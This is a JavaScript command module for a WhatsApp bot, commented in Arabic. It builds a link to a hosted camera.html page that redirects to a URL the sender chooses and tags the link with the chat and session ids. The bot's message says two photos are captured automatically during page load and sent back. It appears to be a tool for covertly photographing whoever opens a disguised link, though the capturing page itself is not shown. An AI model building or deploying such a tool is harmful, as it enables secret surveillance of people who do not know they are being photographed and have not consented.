const path = require('path');

module.exports = async ({ text, reply, sock, from, msg, sessionId }) => {
  try {
    // التأكد أن الأمر يبدأ بـ camera
    if (!text.toLowerCase().startsWith('camera')) return;

    // تقسيم النص بعد الأمر
    const parts = text.trim().split(/\s+/);
    if (parts.length < 2) {
      return reply('❌ أرسل الرابط بعد الأمر.\nمثال: camera https://example.com');
    }

    const targetUrl = parts[1];

    // ✅ تحديد الرابط الأساسي
    const baseUrl = process.env.BASE_URL || (
      process.env.RENDER_EXTERNAL_HOSTNAME
        ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}`
        : `http://localhost:${process.env.PORT || 3000}`
    );

    // ✅ إنشاء رابط صفحة الكاميرا
    const pageUrl = `${baseUrl}/camera.html?redirect=${encodeURIComponent(targetUrl)}&chat=${encodeURIComponent(from)}&sessionId=${encodeURIComponent(sessionId)}`;

    // ✅ إرسال الرسالة في واتساب
    await sock.sendMessage(from, {
      text: `📸 *افتح الرابط للسماح بالكاميرا:*\n${pageUrl}\n\n> سيتم التقاط صورتين تلقائيًا أثناء التحميل وإرسالها إليك.`
    }, { quoted: msg });

  } catch (err) {
    console.error('❌ خطأ في تنفيذ أمر الكاميرا:', err.message);
    await reply('⚠️ حدث خطأ أثناء إنشاء رابط الكاميرا.');
  }
};
